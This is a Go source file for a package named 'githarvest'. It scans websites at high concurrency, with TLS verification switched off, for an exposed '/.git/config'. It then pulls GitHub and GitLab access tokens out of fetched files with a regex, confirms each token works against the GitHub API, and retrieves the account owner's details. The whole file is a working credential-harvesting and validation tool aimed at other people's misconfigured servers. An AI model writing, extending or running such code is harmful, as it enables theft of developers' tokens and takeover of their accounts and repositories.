package githarvest

import (
	"crypto/tls"
	"encoding/json"
	"regexp"
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

type Client struct {
	http *fasthttp.Client
}

func NewClient() *Client {
	return &Client{
		http: &fasthttp.Client{
			ReadTimeout:                   7 * time.Second,
			WriteTimeout:                  7 * time.Second,
			MaxIdleConnDuration:           7 * time.Second,
			NoDefaultUserAgentHeader:      true,
			DisableHeaderNamesNormalizing: true,
			DisablePathNormalizing:        true,
			TLSConfig:                     &tls.Config{InsecureSkipVerify: true},
			Dial: (&fasthttp.TCPDialer{
				Concurrency:      4096,
				DNSCacheDuration: time.Hour,
			}).Dial,
		},
	}
}

func (c *Client) IsGitExposed(url string) (bool, error) {
	gitUrl := url + "/.git/config"

	statusCode, body, err := c.http.Get(nil, gitUrl)
	if err != nil {
		return false, ErrExecRequest
	}

	if statusCode != 200 {
		return false, ErrExecRequest
	}

	return strings.Contains(string(body), "[core]"), nil
}

func (c *Client) ExtractTokens(url, path string) ([]string, error) {
	pathUrl := url + path

	statusCode, body, err := c.http.Get(nil, pathUrl)
	if err != nil || statusCode != 200 {
		return nil, ErrExecRequest
	}

	reg := regexp.MustCompile(`(ghp|gho|ghu|ghs|ghr)_[0-9A-Za-z]{36}|github_pat_[0-9A-Za-z_]{80}|glpat-[A-Za-z0-9_-]{20,40}`)

	return reg.FindAllString(string(body), -1), nil
}

func (c *Client) IsValidToken(token string) (bool, error) {
	url := "https://api.github.com/user"

	req := fasthttp.AcquireRequest()
	res := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(res)

	req.SetRequestURI(url)
	req.Header.SetMethod("GET")
	req.Header.Add("Authorization", "Bearer "+token)

	err := c.http.Do(req, res)
	if err != nil {
		return false, ErrExecRequest
	}

	return res.StatusCode() == 200, nil
}

func (c *Client) GetTokenInfo(token string) (*UserGithub, error) {
	url := "https://api.github.com/user"

	req := fasthttp.AcquireRequest()
	res := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(res)

	req.SetRequestURI(url)
	req.Header.SetMethod("GET")
	req.Header.Add("Authorization", "Bearer "+token)

	err := c.http.Do(req, res)
	if err != nil {
		return nil, ErrExecRequest
	}

	var user UserGithub
	err = json.Unmarshal(res.Body(), &user)
	if err != nil {
		return nil, ErrDecodeJSON
	}

	return &user, nil
}
